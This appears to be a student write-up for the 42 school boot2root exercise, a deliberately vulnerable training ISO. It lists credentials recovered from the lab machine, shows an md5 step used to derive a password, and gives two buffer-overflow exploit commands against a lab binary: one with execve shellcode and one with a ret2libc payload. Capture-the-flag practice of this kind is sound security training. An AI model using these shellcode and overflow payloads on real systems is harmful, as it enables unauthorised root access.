# boot2root

Search for various means to pass root on the ISO given to you (42 project)

```
user mylittleforum:
lmezard:!q\]Ej?*5K5cy*AJ

mails:
admin@borntosec.net
qudevide@borntosec.net
thor@borntosec.net
wandre@borntosec.net
laurie@borntosec.net
zaz@borntosec.net

phpmyadmin:
root:Fg-'kKXBj87E:aJ$

ftp:
lmezard:G!@M6f4Eatau{sF"

ssh:
laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
zaz:646da671ca01bb5d84dbb5fb2238dc8e
```

To get zaz password:

- Create the png with script and get `SLASH`
- The md5 SLASH to get `646da671ca01bb5d84dbb5fb2238dc8e`

```bash
$ echo -n "SLASH" | md5sum
646da671ca01bb5d84dbb5fb2238dc8e  -
```

To exploit binary in zaz home (shellcode and ret2libc):

```bash
./exploit_me $(python -c 'print("\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 62 + "\xbf\xff\xf6\x50"[::-1])')

./exploit_me $(python -c 'print("A" * 140 + "\xb7\xe6\xb0\x60"[::-1] + "BBBB" + "\xb7\xf8\xcc\x58"[::-1])')
```
